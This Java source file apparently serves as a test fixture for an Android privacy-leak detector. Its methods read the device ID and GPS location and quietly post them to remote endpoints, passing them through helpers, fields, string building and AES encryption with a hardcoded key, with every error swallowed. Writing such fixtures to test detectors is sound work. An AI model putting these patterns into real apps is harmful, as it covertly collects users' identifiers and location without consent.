package com.androguard.demohunt;

import android.content.Context;
import android.content.Intent;
import android.location.Location;
import android.location.LocationManager;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.google.firebase.analytics.FirebaseAnalytics;

import java.io.OutputStreamWriter;
import java.io.Writer;
import java.net.HttpURLConnection;
import java.net.URL;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

/**
 * Multi-layer privacy leaks. Helper hops are real interproc (no intra-proc
 * last hop): collect/get DeviceId then HttpSink.post / sendHop only.
 */
public final class PrivacyLayers {
    static final String API = "https://api.demohunt.androguard.com/v1/field";
    static final String BASE = "https://api.demohunt.androguard.com";

    String api;

    PrivacyLayers() {}

    static String collectDeviceId(Context ctx) {
        TelephonyManager tm = (TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
        return tm.getDeviceId();
    }

    static void sendHop(String body, String dest) {
        try {
            URL url = new URL(dest);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            Writer w = new OutputStreamWriter(conn.getOutputStream());
            w.write(body);
            w.close();
        } catch (Throwable ignored) {
        }
    }

    /** collectDeviceId return → HttpSink.post (no intra-proc last hop). */
    public static void leakDeviceIdViaHelper(Context ctx) {
        try {
            String id = collectDeviceId(ctx);
            HttpSink.post(id, "https://api.demohunt.androguard.com/v1/hop");
        } catch (Throwable ignored) {
        }
    }

    /** Same-class 1-hop sendHop (no intra-proc last hop). */
    public static void leakDeviceIdViaLocalHelper(Context ctx) {
        try {
            TelephonyManager tm = (TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
            String id = tm.getDeviceId();
            sendHop(id, "https://api.demohunt.androguard.com/v1/localhop");
        } catch (Throwable ignored) {
        }
    }

    /** BASE + path reconstructed dest; HttpSink only. */
    public static void leakDeviceIdViaBaseConcat(Context ctx) {
        try {
            String id = collectDeviceId(ctx);
            HttpSink.post(id, BASE + "/v1/concat");
        } catch (Throwable ignored) {
        }
    }

    void setApi() {
        this.api = "https://api.demohunt.androguard.com/v1/fieldhop";
    }

    void sendStored(String id) {
        HttpSink.post(id, this.api);
    }

    /** DeviceId → sendStored → HttpSink.post(this.api). */
    public static void leakDeviceIdViaFieldHop(Context ctx) {
        try {
            PrivacyLayers hop = new PrivacyLayers();
            hop.setApi();
            TelephonyManager tm = (TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
            String id = tm.getDeviceId();
            hop.sendStored(id);
        } catch (Throwable ignored) {
        }
    }

    /** DeviceId → Writer.write to {@code new URL(API)}. */
    public static void leakDeviceIdViaFieldUrl(Context ctx) {
        try {
            TelephonyManager tm = (TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
            String id = tm.getDeviceId();
            URL url = new URL(API);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            Writer w = new OutputStreamWriter(conn.getOutputStream());
            w.write(id);
            w.close();
        } catch (Throwable ignored) {
        }
    }

    /** getDeviceId → getBytes → Cipher.doFinal → Base64 → write (and helper). */
    public static void leakDeviceIdCipherThenHelper(Context ctx) {
        try {
            TelephonyManager tm = (TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
            String id = tm.getDeviceId();
            byte[] raw = id.getBytes();
            Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
            SecretKeySpec key = new SecretKeySpec(new byte[] {
                1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16
            }, "AES");
            cipher.init(Cipher.ENCRYPT_MODE, key);
            byte[] enc = cipher.doFinal(raw);
            String leaked = android.util.Base64.encodeToString(enc, 0);
            sendHop(leaked, "https://api.demohunt.androguard.com/v1/cipherhop");
            HttpSink.post(leaked, "https://api.demohunt.androguard.com/v1/cipherhop");
            URL url = new URL("https://api.demohunt.androguard.com/v1/cipherhop");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            Writer w = new OutputStreamWriter(conn.getOutputStream());
            w.write(leaked);
            w.close();
        } catch (Throwable ignored) {
        }
    }

    /**
     * Location → putExtra("lat") → getStringExtra("lat") + Log in this method
     * (field-sensitive extras), then helper.
     */
    public static void leakLocationViaExtraHop(Context ctx) {
        try {
            LocationManager lm = (LocationManager) ctx.getSystemService(Context.LOCATION_SERVICE);
            Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            double lat = loc.getLatitude();
            String latStr = String.valueOf(lat);
            Intent i = new Intent("com.androguard.demohunt.LOC");
            i.putExtra("lat", latStr);
            String v = i.getStringExtra("lat");
            Log.d("DemoHunt", v);
            forwardLocation(i);
        } catch (Throwable ignored) {
        }
    }

    static void forwardLocation(Intent i) {
        String v = i.getStringExtra("lat");
        Log.d("DemoHunt", v);
    }

    /** DeviceId → StringBuilder.append → toString → write (and helper). */
    public static void leakDeviceIdViaBuilder(Context ctx) {
        try {
            TelephonyManager tm = (TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
            String id = tm.getDeviceId();
            StringBuilder sb = new StringBuilder();
            sb.append(id);
            String leaked = sb.toString();
            String dest = "https://api.demohunt.androguard.com/v1/builder";
            URL url = new URL(dest);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            Writer w = new OutputStreamWriter(conn.getOutputStream());
            w.write(leaked);
            w.write(id);
            w.close();
            sendHop(leaked, dest);
        } catch (Throwable ignored) {
        }
    }

    /** DeviceId → AnalyticsWrapper.log plus intra-proc firebase host write. */
    public static void leakDeviceIdViaSdkWrapper(Context ctx) {
        try {
            TelephonyManager tm = (TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
            String id = tm.getDeviceId();
            AnalyticsWrapper.log(ctx, id);
            FirebaseAnalytics analytics = FirebaseAnalytics.getInstance(ctx);
            Bundle bundle = new Bundle();
            bundle.putString("id", id);
            analytics.logEvent("id", bundle);
            URL url = new URL("https://app-analytics.firebase.google.com/log");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            Writer w = new OutputStreamWriter(conn.getOutputStream());
            w.write(id);
            w.close();
        } catch (Throwable ignored) {
        }
    }
}

final class HttpSink {
    private HttpSink() {}

    static void post(String body, String dest) {
        try {
            URL url = new URL(dest);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            Writer w = new OutputStreamWriter(conn.getOutputStream());
            w.write(body);
            w.close();
        } catch (Throwable ignored) {
        }
    }
}

final class AnalyticsWrapper {
    private AnalyticsWrapper() {}

    static void log(Context ctx, String id) {
        try {
            FirebaseAnalytics analytics = FirebaseAnalytics.getInstance(ctx);
            Bundle bundle = new Bundle();
            bundle.putString("id", id);
            analytics.logEvent("id", bundle);
            String dest = "https://app-analytics.firebase.google.com/log";
            URL url = new URL(dest);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            Writer w = new OutputStreamWriter(conn.getOutputStream());
            w.write(id);
            w.close();
        } catch (Throwable ignored) {
        }
    }
}
